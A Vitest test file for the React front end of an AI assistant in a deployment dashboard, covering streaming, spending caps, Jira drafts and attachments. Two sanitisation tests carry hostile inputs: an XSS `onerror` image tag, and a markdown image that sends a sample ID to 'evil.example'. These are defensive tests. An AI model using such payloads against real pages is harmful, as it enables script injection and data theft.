// @vitest-environment happy-dom
import { readdirSync, readFileSync } from "node:fs";
import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import * as React from "react";
import { act } from "react";
import { createRoot } from "react-dom/client";
import { IntlProvider } from "use-intl";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { applyBranding } from "@/i18n/branding";
import { locales } from "@/i18n/locales";
import enMessages from "../messages/en.json";

const messages = applyBranding(enMessages, {
  appName: "Menara",
  allowedEmailDomain: "example.com",
});

const api = vi.hoisted(() => ({
  createJiraIssue: vi.fn(),
  saveDraft: vi.fn(),
  sendMessage: vi.fn(),
  createConversation: vi.fn(),
  generateDraft: vi.fn(),
}));
const nav = vi.hoisted(() => ({ pathname: "/" }));

vi.mock("sonner", () => ({ toast: { success: vi.fn(), error: vi.fn() } }));
vi.mock("@/web/api/assistant", () => ({
  getAllowanceQuery: () => ({
    queryKey: ["assistant", "getAllowance"],
    queryFn: () => new Promise(() => {}),
  }),
  getConversationQuery: (id: string) => ({
    queryKey: ["assistant", "getConversation", [id]],
    queryFn: () => new Promise(() => {}),
  }),
  listConversationsQuery: (id: string) => ({
    queryKey: ["assistant", "listConversations", [id]],
    queryFn: () => new Promise(() => {}),
  }),
  listIssueAttachmentsQuery: (env: string, key: string) => ({
    queryKey: ["assistant", "listIssueAttachments", [env, key]],
    queryFn: () => new Promise(() => {}),
  }),
  messageStreamUrl: (id: string) => `/api/assistant/stream?messageId=${id}`,
  ...api,
}));
vi.mock("@/i18n/navigation", () => ({
  usePathname: () => nav.pathname,
  Link: ({
    href,
    children,
    ...rest
  }: {
    href: string;
    children?: React.ReactNode;
  }) => (
    <a href={href} {...rest}>
      {children}
    </a>
  ),
}));
// The sidebar's own filtering, not the shadcn sidebar primitives.
vi.mock("@/components/active-runs-provider", () => ({
  useActiveRunCount: () => 0,
  useActiveRuns: () => [],
}));
vi.mock("@/components/motif-provider", () => ({
  useMotif: () => ({ motif: null }),
}));
vi.mock("@/components/brand-mark", () => ({ BrandLogo: () => null }));
vi.mock("@/components/user-menu", () => ({ UserMenu: () => null }));
vi.mock("@/components/ui/sidebar", () => {
  const Pass = ({ children }: { children?: React.ReactNode }) => (
    <div>{children}</div>
  );
  return {
    Sidebar: Pass,
    SidebarContent: Pass,
    SidebarFooter: Pass,
    SidebarGroup: Pass,
    SidebarGroupContent: Pass,
    SidebarGroupLabel: Pass,
    SidebarHeader: Pass,
    SidebarMenu: Pass,
    SidebarMenuItem: Pass,
    SidebarMenuButton: ({
      render,
      children,
    }: {
      render: React.ReactElement;
      children?: React.ReactNode;
    }) => React.cloneElement(render, {}, children),
  };
});

import { AppSidebar } from "@/components/app-sidebar";
import { ApiError } from "@/web/api/client";
import { AllowanceBadge } from "@/web/components/assistant/allowance-badge";
import { AssistantWorkspace } from "@/web/components/assistant/assistant-workspace";
import { AttachmentPicker } from "@/web/components/assistant/attachment-picker";
import { ChatThread } from "@/web/components/assistant/chat-thread";
import { Composer } from "@/web/components/assistant/composer";
import { DraftPanel } from "@/web/components/assistant/draft-panel";
import { JiraDraftForm } from "@/web/components/assistant/jira-draft-form";
import {
  MessageSources,
  summarizeReads,
} from "@/web/components/assistant/message-sources";

(
  globalThis as { IS_REACT_ACT_ENVIRONMENT?: boolean }
).IS_REACT_ACT_ENVIRONMENT = true;

// --- a controllable EventSource ---------------------------------------------

class FakeEventSource {
  static readonly CONNECTING = 0;
  static readonly OPEN = 1;
  static readonly CLOSED = 2;
  static instances: FakeEventSource[] = [];
  readonly url: string;
  readyState = FakeEventSource.OPEN;
  closed = false;
  onerror: (() => void) | null = null;
  private listeners = new Map<string, ((event: MessageEvent) => void)[]>();

  constructor(url: string) {
    this.url = url;
    FakeEventSource.instances.push(this);
  }
  addEventListener(type: string, listener: (event: MessageEvent) => void) {
    this.listeners.set(type, [...(this.listeners.get(type) ?? []), listener]);
  }
  close() {
    this.closed = true;
    this.readyState = FakeEventSource.CLOSED;
  }
  emit(type: string, data: unknown) {
    this.emitRaw(type, JSON.stringify(data));
  }
  emitRaw(type: string, data: string) {
    const event = new MessageEvent(type, { data });
    for (const listener of this.listeners.get(type) ?? []) listener(event);
  }
}

// --- rendering ---------------------------------------------------------------

let container: HTMLDivElement;
let root: ReturnType<typeof createRoot>;
let queryClient: QueryClient;

beforeEach(() => {
  queryClient = new QueryClient({
    defaultOptions: { queries: { retry: false, staleTime: Infinity } },
  });
  FakeEventSource.instances = [];
  vi.stubGlobal("EventSource", FakeEventSource);
  for (const fn of Object.values(api)) fn.mockReset();
});

afterEach(() => {
  act(() => root.unmount());
  container.remove();
  document.body.innerHTML = "";
  vi.unstubAllGlobals();
});

async function render(ui: React.ReactNode) {
  container = document.createElement("div");
  document.body.append(container);
  root = createRoot(container);
  await act(async () => {
    root.render(
      <QueryClientProvider client={queryClient}>
        <IntlProvider
          locale="en"
          messages={messages}
          timeZone="Asia/Jakarta"
          now={new Date("2026-11-16T05:00:00Z")}
        >
          {ui}
        </IntlProvider>
      </QueryClientProvider>
    );
  });
}

const text = () => document.body.textContent ?? "";
const button = (label: string) =>
  [...document.querySelectorAll("button")].find(
    (b) => b.textContent?.trim() === label
  );

const t = messages.assistant;

// --- tests -------------------------------------------------------------------

describe("Assistant tab in the environment sidebar", () => {
  const scope = {
    environments: [
      {
        id: "e1",
        projectId: "p1",
        key: "HMEM",
        slug: "dev",
        name: "Dev",
        kind: "dev",
        hasMailpit: false,
        serviceRoles: [],
        projectReleasable: false,
      },
    ],
    projects: [{ id: "p1", key: "HMEM", name: "Heron Membership" }],
  };
  const renderSidebar = (assistantEnabled: boolean) => {
    nav.pathname = "/HMEM/dev/deploys";
    return render(
      <AppSidebar
        environments={scope.environments as never}
        projects={scope.projects}
        orgRole="engineer"
        projectRoles={{ p1: "qa" }}
        issueCounts={{ total: 0 } as never}
        openCounts={{}}
        user={
          { id: "u", name: "U", email: "u@example.com", image: null } as never
        }
        logo={"menara" as never}
        assistantEnabled={assistantEnabled}
      />
    );
  };
  const hrefs = () =>
    [...container.querySelectorAll("a")].map((a) => a.getAttribute("href"));

  it("is hidden while the assistant is disabled", async () => {
    await renderSidebar(false);
    expect(hrefs()).not.toContain("/HMEM/dev/assistant");
  });

  it("is shown (to a QA too) once it is enabled", async () => {
    await renderSidebar(true);
    expect(hrefs()).toContain("/HMEM/dev/assistant");
  });
});

describe("daily cap", () => {
  const allowance = {
    enabled: true,
    capUsd: 1.5,
    spentUsd: 1.6,
    remainingUsd: 0,
    // Midnight in Asia/Jakarta.
    resetsAt: "2026-11-16T17:00:00.000Z",
  };

  it("the badge shows what is left today", async () => {
    await render(
      <AllowanceBadge
        allowance={{ ...allowance, spentUsd: 0.25, remainingUsd: 1.25 }}
      />
    );
    expect(text()).toBe("Left today: $1.25");
  });

  it("the badge never rounds a last fraction of a cent to $0.00", async () => {
    await render(
      <AllowanceBadge allowance={{ ...allowance, remainingUsd: 0.004 }} />
    );
    expect(text()).toBe("Left today: < $0.01");
  });

  it("the badge shows the cap message with the reset in local time", async () => {
    await render(<AllowanceBadge allowance={allowance} />);
    expect(text()).toContain("allowance of 1.5 USD");
    expect(text()).toMatch(/resets at (12:00|00:00)/);
  });

  it("a refused send words assistant.daily_cap_reached", async () => {
    const onSend = vi.fn().mockRejectedValue(
      new ApiError(429, "server text", "assistant.daily_cap_reached", {
        capUsd: 1.5,
        resetsAt: allowance.resetsAt,
      })
    );
    await render(
      <Composer
        environmentId="e1"
        disabled={false}
        onSend={onSend}
        focusKey="new"
      />
    );
    const box = container.querySelector("textarea");
    if (!box) throw new Error("no textarea");
    await act(async () => {
      const setter = Object.getOwnPropertyDescriptor(
        HTMLTextAreaElement.prototype,
        "value"
      )?.set;
      setter?.call(box, "Bagaimana iuran dihitung?");
      box.dispatchEvent(new Event("input", { bubbles: true }));
    });
    await act(async () => button(t.send)?.click());
    expect(onSend).toHaveBeenCalledWith("Bagaimana iuran dihitung?", []);
    expect(text()).toContain("allowance of 1.5 USD");
    expect(text()).not.toContain("server text");
    // Kept so it can be sent again tomorrow.
    expect(box.value).toBe("Bagaimana iuran dihitung?");
  });
});

describe("Create Jira ticket", () => {
  const draft = {
    id: "d1",
    kind: "jira" as const,
    content: {
      summary: "Validasi NIK saat registrasi",
      issueType: "Story",
      description: "Deskripsi",
      acceptanceCriteria: ["NIK 16 digit"],
    },
    issueId: null,
    jiraKey: null,
    issueNumber: null,
    createdAt: "2026-11-16T01:00:00Z",
    updatedAt: "2026-11-16T01:00:00Z",
  };
  const renderForm = (props: {
    jiraPushEnabled: boolean;
    canCreateIssue?: boolean;
    draft?: typeof draft | Record<string, unknown>;
  }) =>
    render(
      <JiraDraftForm
        draft={(props.draft ?? draft) as never}
        projectKey="HMEM"
        jiraPushEnabled={props.jiraPushEnabled}
        canCreateIssue={props.canCreateIssue ?? true}
      />
    );

  it("is disabled with a hint when the project's Jira push is off", async () => {
    await renderForm({ jiraPushEnabled: false });
    expect(button(t.createJira)?.disabled).toBe(true);
    expect(text()).toContain(t.jiraPushOff);
  });

  it("is disabled with a hint without the right to create issues", async () => {
    await renderForm({ jiraPushEnabled: true, canCreateIssue: false });
    expect(button(t.createJira)?.disabled).toBe(true);
    expect(text()).toContain(t.noIssueWrite);
  });

  it("asks for confirmation (summary and type) before creating", async () => {
    api.createJiraIssue.mockResolvedValue({ issueId: "i1", jiraKey: "KST-9" });
    await renderForm({ jiraPushEnabled: true });
    const create = button(t.createJira);
    expect(create?.disabled).toBe(false);
    await act(async () => create?.click());
    expect(api.createJiraIssue).not.toHaveBeenCalled();
    const dialog = document.querySelector('[role="dialog"]');
    expect(dialog?.textContent).toContain(t.confirmCreateDescription);
    expect(dialog?.textContent).toContain("Validasi NIK saat registrasi");
    expect(dialog?.textContent).toContain("Story");
    await act(async () => button(t.confirmCreate)?.click());
    expect(api.createJiraIssue).toHaveBeenCalledWith("d1");
  });

  it("a 403 from the server becomes the no-right hint", async () => {
    api.createJiraIssue.mockRejectedValue(new ApiError(403, "Forbidden"));
    await renderForm({ jiraPushEnabled: true });
    await act(async () => button(t.createJira)?.click());
    await act(async () => button(t.confirmCreate)?.click());
    expect(text()).toContain(t.noIssueWrite);
    expect(text()).not.toContain("Forbidden");
    expect(button(t.createJira)?.disabled).toBe(true);
  });

  it("is disabled while the draft has unsaved edits", async () => {
    await renderForm({ jiraPushEnabled: true });
    const summary =
      container.querySelector<HTMLInputElement>("#draft-d1-summary");
    if (!summary) throw new Error("no summary");
    await act(async () => {
      Object.getOwnPropertyDescriptor(
        HTMLInputElement.prototype,
        "value"
      )?.set?.call(summary, "Ringkasan baru");
      summary.dispatchEvent(new Event("input", { bubbles: true }));
    });
    expect(button(t.createJira)?.disabled).toBe(true);
    expect(text()).toContain(t.saveBeforeCreate);
  });

  it("links the created issue to the Panel issue", async () => {
    await renderForm({
      jiraPushEnabled: true,
      draft: { ...draft, issueId: "i1", jiraKey: "KST-9", issueNumber: 42 },
    });
    expect(text()).toContain("Created as KST-9.");
    expect(
      container.querySelector('a[href="/HMEM/issues/42"]')?.textContent
    ).toContain(t.openPanelIssue);
    expect(button(t.createJira)).toBeUndefined();
  });
});

describe("sources", () => {
  const source = {
    componentKey: "backend",
    repoFullName: "acme/membership",
    ciConnectionId: null,
    ref: "kestrel/development",
  };

  it("marks a never-deployed and an unknown-commit component", async () => {
    await render(
      <MessageSources
        sources={[
          {
            ...source,
            commitSha: "0123456789abcdef",
            deployed: true,
            deployedAt: "2026-11-16T03:00:00Z",
          },
          {
            ...source,
            componentKey: "portal",
            repoFullName: "acme/portal",
            commitSha: null,
            deployed: false,
            deployedAt: null,
          },
          {
            ...source,
            componentKey: "legacy",
            repoFullName: "acme/legacy",
            commitSha: null,
            deployed: true,
            deployedAt: "2026-11-15T03:00:00Z",
          },
        ]}
        toolCalls={[]}
      />
    );
    await act(async () => button(t.sources)?.click());
    expect(text()).toContain("acme/membership @ 0123456");
    expect(text()).toContain(
      "never deployed — using the head of branch kestrel/development"
    );
    expect(text()).toContain(
      "running commit unknown — using the head of branch kestrel/development"
    );
  });

  it("lists what the tools read, with the withheld count", () => {
    expect(
      summarizeReads([
        { tool: "list_files", meta: { withheld: 2 } },
        { tool: "search_code", meta: { paths: ["a.ts", "b.ts"], withheld: 1 } },
        { tool: "read_file", meta: { paths: ["a.ts"], ranges: ["a.ts:1-40"] } },
        { tool: "get_issue", meta: { issueKeys: ["KST-1"] } },
        { tool: "search_docs", meta: { docSlugs: ["iuran"], paths: 3 } },
      ])
    ).toEqual({
      files: ["a.ts:1-40", "b.ts"],
      issueKeys: ["KST-1"],
      docSlugs: ["iuran"],
      withheld: 3,
    });
  });
});

describe("answer stream", () => {
  const conversation = (status: string) => ({
    id: "c1",
    title: "Iuran",
    environmentId: "e1",
    environmentName: "Dev",
    drafts: [],
    jiraPushEnabled: false,
    messages: [
      {
        id: "m1",
        role: "user",
        content: "Bagaimana iuran dihitung?",
        status: "done",
        errorCode: null,
        sources: null,
        attachmentIds: [],
        createdAt: "2026-11-16T01:00:00Z",
        toolCalls: [],
      },
      {
        id: "m2",
        role: "assistant",
        content: "",
        status,
        errorCode: null,
        sources: null,
        attachmentIds: [],
        createdAt: "2026-11-16T01:00:01Z",
        toolCalls: [],
      },
    ],
  });
  const key = ["assistant", "getConversation", ["c1"]];

  it("closes the EventSource on a terminal snapshot and refetches", async () => {
    queryClient.setQueryData(key, conversation("queued"));
    const invalidate = vi.spyOn(queryClient, "invalidateQueries");
    await render(<ChatThread conversationId="c1" />);
    const [source] = FakeEventSource.instances;
    expect(source?.url).toBe("/api/assistant/stream?messageId=m2");

    await act(async () =>
      source?.emit("snapshot", {
        content: "Iuran dihitung dari **gaji pokok**.",
        status: "streaming",
        errorCode: null,
        toolCalls: [],
      })
    );
    expect(source?.closed).toBe(false);
    expect(container.querySelector("strong")?.textContent).toBe("gaji pokok");

    await act(async () =>
      source?.emit("snapshot", {
        content: "Iuran dihitung dari gaji pokok.",
        status: "done",
        errorCode: null,
        toolCalls: [],
      })
    );
    expect(source?.closed).toBe(true);
    expect(invalidate).toHaveBeenCalledWith({ queryKey: key });
    expect(text()).toContain(t.disclaimer);
    expect(FakeEventSource.instances).toHaveLength(1);
  });

  it("closes on a malformed frame and refetches", async () => {
    queryClient.setQueryData(key, conversation("streaming"));
    const invalidate = vi.spyOn(queryClient, "invalidateQueries");
    await render(<ChatThread conversationId="c1" />);
    const [source] = FakeEventSource.instances;
    await act(async () => source?.emitRaw("snapshot", "{not json"));
    expect(source?.closed).toBe(true);
    expect(invalidate).toHaveBeenCalledWith({ queryKey: key });
  });

  it("closes on not-found and on unmount", async () => {
    queryClient.setQueryData(key, conversation("streaming"));
    await render(<ChatThread conversationId="c1" />);
    const [first] = FakeEventSource.instances;
    await act(async () => first?.emit("not-found", { id: "m2" }));
    expect(first?.closed).toBe(true);

    act(() => root.unmount());
    queryClient.setQueryData(key, conversation("streaming"));
    await render(<ChatThread conversationId="c1" />);
    const second = FakeEventSource.instances.at(-1);
    expect(second?.closed).toBe(false);
    act(() => root.unmount());
    expect(second?.closed).toBe(true);
    // afterEach unmounts again.
    root = createRoot(container);
  });

  it("opens no stream for a finished answer and words a failure", async () => {
    queryClient.setQueryData(key, {
      ...conversation("failed"),
      messages: conversation("failed").messages.map((m) =>
        m.id === "m2" ? { ...m, errorCode: "assistant.credit_exhausted" } : m
      ),
    });
    await render(<ChatThread conversationId="c1" />);
    expect(FakeEventSource.instances).toHaveLength(0);
    expect(text()).toContain(messages.assistantErrors.creditExhausted);
  });

  it("words a turn stopped at the daily cap with the current allowance", async () => {
    queryClient.setQueryData(["assistant", "getAllowance"], {
      enabled: true,
      capUsd: 1.5,
      spentUsd: 1.6,
      remainingUsd: 0,
      resetsAt: "2026-11-16T17:00:00.000Z",
    });
    queryClient.setQueryData(key, {
      ...conversation("failed"),
      messages: conversation("failed").messages.map((m) =>
        m.id === "m2" ? { ...m, errorCode: "assistant.daily_cap_reached" } : m
      ),
    });
    await render(<ChatThread conversationId="c1" />);
    expect(text()).toContain("allowance of 1.5 USD");
    expect(text()).toMatch(/resets at (12:00|00:00)/);
  });

  it("renders no raw HTML from an answer", async () => {
    queryClient.setQueryData(key, {
      ...conversation("done"),
      messages: conversation("done").messages.map((m) =>
        m.id === "m2"
          ? {
              ...m,
              content:
                'Lihat <img src=x onerror="alert(1)"> [docs](https://example.com)',
            }
          : m
      ),
    });
    await render(<ChatThread conversationId="c1" />);
    expect(container.querySelector("img")).toBeNull();
    const link = container.querySelector('a[href="https://example.com"]');
    expect(link?.getAttribute("target")).toBe("_blank");
    expect(link?.getAttribute("rel")).toContain("noopener");
  });

  it("never loads a markdown image (no img, no preload)", async () => {
    queryClient.setQueryData(key, {
      ...conversation("done"),
      messages: conversation("done").messages.map((m) =>
        m.id === "m2"
          ? {
              ...m,
              content:
                "Lihat ![x](https://example.com/a.png) dan ![](https://evil.example/p?d=NIK123)",
            }
          : m
      ),
    });
    await render(<ChatThread conversationId="c1" />);
    expect(document.querySelector("img")).toBeNull();
    expect(document.querySelector('link[rel="preload"]')).toBeNull();
    expect(document.documentElement.innerHTML).not.toContain(
      "example.com/a.png"
    );
    expect(document.documentElement.innerHTML).not.toContain("NIK123");
    expect(text()).toContain("Lihat x dan");
  });
});

describe("composer attachments", () => {
  it("sends each ticked attachment with its issue key", async () => {
    queryClient.setQueryData(
      ["assistant", "listIssueAttachments", ["e1", "KST-12"]],
      {
        key: "KST-12",
        unavailable: false,
        attachments: [
          {
            id: "10001",
            filename: "BRD.pdf",
            mime: "application/pdf",
            sizeBytes: 10,
          },
        ],
      }
    );
    const onSend = vi.fn().mockResolvedValue(undefined);
    await render(
      <Composer
        environmentId="e1"
        disabled={false}
        onSend={onSend}
        focusKey="new"
      />
    );
    await act(async () => button(t.attachments)?.click());
    const input = document.querySelector<HTMLInputElement>(
      "#assistant-issue-key"
    );
    if (!input) throw new Error("no input");
    await act(async () => {
      Object.getOwnPropertyDescriptor(
        HTMLInputElement.prototype,
        "value"
      )?.set?.call(input, "kst-12");
      input.dispatchEvent(new Event("input", { bubbles: true }));
    });
    await act(async () => button(t.showAttachments)?.click());
    await act(async () =>
      (
        document.querySelector(
          '[role="checkbox"][aria-labelledby="assistant-attachment-10001-label"]'
        ) as HTMLElement | null
      )?.click()
    );
    await act(async () => button("Use 1 attachment")?.click());
    const box = container.querySelector("textarea");
    if (!box) throw new Error("no textarea");
    await act(async () => {
      Object.getOwnPropertyDescriptor(
        HTMLTextAreaElement.prototype,
        "value"
      )?.set?.call(box, "Apa isi BRD ini?");
      box.dispatchEvent(new Event("input", { bubbles: true }));
    });
    await act(async () => button(t.send)?.click());
    expect(onSend).toHaveBeenCalledWith("Apa isi BRD ini?", [
      { issueKey: "KST-12", attachmentId: "10001" },
    ]);
  });
});

describe("composer focus and keys", () => {
  const composer = (focusKey: string | null) => (
    <Composer
      environmentId="e1"
      disabled={false}
      onSend={vi.fn().mockResolvedValue(undefined)}
      focusKey={focusKey}
    />
  );
  // Same tree shape as render(), so a re-render keeps the mounted textarea.
  const rerender = (ui: React.ReactNode) =>
    act(async () =>
      root.render(
        <QueryClientProvider client={queryClient}>
          <IntlProvider
            locale="en"
            messages={messages}
            timeZone="Asia/Jakarta"
            now={new Date("2026-11-16T05:00:00Z")}
          >
            {ui}
          </IntlProvider>
        </QueryClientProvider>
      )
    );

  it("focuses the textarea on render and again when focusKey changes", async () => {
    await render(composer("new"));
    const box = container.querySelector("textarea");
    if (!box) throw new Error("no textarea");
    expect(document.activeElement).toBe(box);
    box.blur();
    expect(document.activeElement).not.toBe(box);
    await rerender(composer("c1"));
    expect(document.activeElement).toBe(box);
  });

  it("Enter sends, Shift+Enter does not, and focus returns after a send", async () => {
    const onSend = vi.fn().mockResolvedValue(undefined);
    await render(
      <Composer
        environmentId="e1"
        disabled={false}
        onSend={onSend}
        focusKey="new"
      />
    );
    const box = container.querySelector("textarea");
    if (!box) throw new Error("no textarea");
    await act(async () => {
      Object.getOwnPropertyDescriptor(
        HTMLTextAreaElement.prototype,
        "value"
      )?.set?.call(box, "Hello");
      box.dispatchEvent(new Event("input", { bubbles: true }));
    });
    await act(async () => {
      box.dispatchEvent(
        new KeyboardEvent("keydown", {
          key: "Enter",
          shiftKey: true,
          bubbles: true,
        })
      );
    });
    expect(onSend).not.toHaveBeenCalled();
    box.blur();
    await act(async () => {
      box.dispatchEvent(
        new KeyboardEvent("keydown", {
          key: "Enter",
          bubbles: true,
          cancelable: true,
        })
      );
    });
    expect(onSend).toHaveBeenCalledWith("Hello", []);
    expect(box.value).toBe("");
    expect(document.activeElement).toBe(box);
  });
});

describe("draft panel", () => {
  const conversation = {
    id: "c1",
    title: "Iuran",
    environmentId: "e1",
    environmentName: "Dev",
    drafts: [],
    jiraPushEnabled: false,
    messages: [
      {
        id: "m2",
        role: "assistant",
        content: "Jawaban",
        status: "done",
        errorCode: null,
        sources: null,
        attachmentIds: [],
        createdAt: "2026-11-16T01:00:01Z",
        toolCalls: [],
      },
    ],
  };
  const key = ["assistant", "getConversation", ["c1"]];

  it("refetches the conversation after a failed generate (the draft may exist) and shows the error", async () => {
    queryClient.setQueryData(key, conversation);
    const invalidate = vi.spyOn(queryClient, "invalidateQueries");
    // A proxy timeout: no problem+json body, so no code.
    api.generateDraft.mockRejectedValue(new ApiError(504, "Gateway Timeout"));
    await render(
      <DraftPanel
        conversationId="c1"
        projectKey="HMEM"
        canCreateIssue
        disabled={false}
      />
    );
    await act(async () => button(t.draftBrd)?.click());
    expect(api.generateDraft).toHaveBeenCalledWith({
      conversationId: "c1",
      kind: "brd",
    });
    expect(invalidate).toHaveBeenCalledWith({ queryKey: key });
    expect(text()).toContain(messages.assistantErrors.failed);
    expect(text()).not.toContain("Gateway Timeout");
  });
});

describe("drafts panel in the workspace", () => {
  const draft = (id: string) => ({
    id,
    kind: "brd" as const,
    content: { title: "BRD", sections: [] },
    issueId: null,
    jiraKey: null,
    issueNumber: null,
    createdAt: "2026-11-16T01:00:00Z",
    updatedAt: "2026-11-16T01:00:00Z",
  });
  const conversation = {
    id: "c1",
    title: "Iuran",
    environmentId: "e1",
    environmentName: "Dev",
    drafts: [] as ReturnType<typeof draft>[],
    jiraPushEnabled: false,
    messages: [],
  };
  const conversationKey = ["assistant", "getConversation", ["c1"]];
  const panel = () => document.querySelector('section[aria-label^="Drafts"]');
  const toggle = (count: number) =>
    button(t.drafts.replace("{count}", String(count)));

  const renderWorkspace = async () => {
    queryClient.setQueryData(["assistant", "getAllowance"], {
      enabled: true,
      capUsd: 1.5,
      spentUsd: 0,
      remainingUsd: 1.5,
      resetsAt: "2026-11-16T17:00:00.000Z",
    });
    queryClient.setQueryData(
      ["assistant", "listConversations", ["e1"]],
      [{ id: "c1", title: "Iuran", updatedAt: "2026-11-16T01:00:00Z" }]
    );
    queryClient.setQueryData(conversationKey, conversation);
    await render(
      <AssistantWorkspace
        environmentId="e1"
        environmentName="Dev"
        projectKey="ACME"
        canCreateIssue
      />
    );
  };

  it("has no drafts toggle until a conversation is selected", async () => {
    await renderWorkspace();
    expect(toggle(0)).toBeUndefined();
    expect(panel()).toBeNull();
  });

  it("is closed initially and the Drafts button toggles it", async () => {
    await renderWorkspace();
    const item = [...document.querySelectorAll("nav button")].find((b) =>
      b.textContent?.includes("Iuran")
    ) as HTMLButtonElement | undefined;
    await act(async () => item?.click());
    expect(panel()).toBeNull();
    await act(async () => toggle(0)?.click());
    expect(panel()).not.toBeNull();
    await act(async () => toggle(0)?.click());
    expect(panel()).toBeNull();
  });

  it("opens when the conversation gains a draft", async () => {
    await renderWorkspace();
    const item = [...document.querySelectorAll("nav button")].find((b) =>
      b.textContent?.includes("Iuran")
    ) as HTMLButtonElement | undefined;
    await act(async () => item?.click());
    expect(panel()).toBeNull();
    await act(async () => {
      queryClient.setQueryData(conversationKey, {
        ...conversation,
        drafts: [draft("d1")],
      });
      // React Query notifies observers on a zero-delay timer.
      await new Promise((resolve) => setTimeout(resolve, 0));
    });
    expect(panel()).not.toBeNull();
    expect(toggle(1)).toBeDefined();
  });
});

describe("attachment picker", () => {
  it("shows already-picked attachments locked and counts them in the limit", async () => {
    queryClient.setQueryData(
      ["assistant", "listIssueAttachments", ["e1", "KST-1"]],
      {
        key: "KST-1",
        unavailable: false,
        attachments: [
          {
            id: "1",
            filename: "a.xlsx",
            mime: "application/xlsx",
            sizeBytes: 10,
          },
          {
            id: "2",
            filename: "b.pdf",
            mime: "application/pdf",
            sizeBytes: 20,
          },
          { id: "3", filename: "c.png", mime: "image/png", sizeBytes: 30 },
        ],
      }
    );
    const onAdd = vi.fn();
    await render(
      <AttachmentPicker
        environmentId="e1"
        open
        onOpenChange={() => {}}
        max={2}
        picked={new Set(["1"])}
        onAdd={onAdd}
      />
    );
    const input = document.querySelector<HTMLInputElement>(
      "#assistant-issue-key"
    );
    if (!input) throw new Error("no input");
    await act(async () => {
      Object.getOwnPropertyDescriptor(
        HTMLInputElement.prototype,
        "value"
      )?.set?.call(input, "kst-1");
      input.dispatchEvent(new Event("input", { bubbles: true }));
    });
    await act(async () => button(t.showAttachments)?.click());
    const box = (id: string) =>
      document.querySelector(
        `[role="checkbox"][aria-labelledby="assistant-attachment-${id}-label"]`
      );
    expect(box("1")?.getAttribute("aria-checked")).toBe("true");
    expect(box("1")?.hasAttribute("data-disabled")).toBe(true);
    // One slot left of two: ticking b.pdf locks c.png.
    await act(async () => (box("2") as HTMLElement | null)?.click());
    expect(box("2")?.getAttribute("aria-checked")).toBe("true");
    expect(box("3")?.hasAttribute("data-disabled")).toBe(true);
    await act(async () => button("Use 1 attachment")?.click());
    expect(onAdd).toHaveBeenCalledWith([
      { id: "2", filename: "b.pdf", issueKey: "KST-1" },
    ]);
  });
});

describe("assistant messages", () => {
  const load = (locale: string) =>
    JSON.parse(readFileSync(`messages/${locale}.json`, "utf8")) as {
      assistant: Record<string, string>;
      assistantErrors: Record<string, string>;
      breadcrumbs: Record<string, string>;
      nav: Record<string, string>;
      common: Record<string, string>;
    };
  const en = load("en");

  for (const locale of locales) {
    it(`${locale} has every assistant key`, () => {
      const m = load(locale);
      expect(Object.keys(m.assistant).sort()).toEqual(
        Object.keys(en.assistant).sort()
      );
      expect(Object.keys(m.assistantErrors).sort()).toEqual(
        Object.keys(en.assistantErrors).sort()
      );
      for (const value of Object.values(m.assistant)) {
        expect(value.trim().length).toBeGreaterThan(0);
      }
      expect(m.breadcrumbs.assistant?.length).toBeGreaterThan(0);
      expect(m.nav.assistant?.length).toBeGreaterThan(0);
    });
  }

  it("every key the components use exists", () => {
    const dir = "web/components/assistant";
    // `t` / `tAssistant` read `assistant`; `tErrors` `assistantErrors`;
    // `tCommon` `common`.
    const namespaces: Record<string, Record<string, string>> = {
      t: en.assistant,
      tAssistant: en.assistant,
      tErrors: en.assistantErrors,
      tCommon: en.common,
    };
    const files = [
      ...readdirSync(dir).map((f) => `${dir}/${f}`),
      "web/routes/$locale/_app/$projectKey.$envSlug.assistant.tsx",
    ];
    const missing: string[] = [];
    let used = 0;
    for (const file of files) {
      const source = readFileSync(file, "utf8");
      for (const match of source.matchAll(
        /\b(t|tAssistant|tErrors|tCommon)\("([a-zA-Z]+)"/g
      )) {
        const [, fn = "", key = ""] = match;
        used++;
        if (!(key in (namespaces[fn] ?? {}))) missing.push(`${fn}:${key}`);
      }
    }
    expect(used).toBeGreaterThan(20);
    expect(missing).toEqual([]);
  });
});
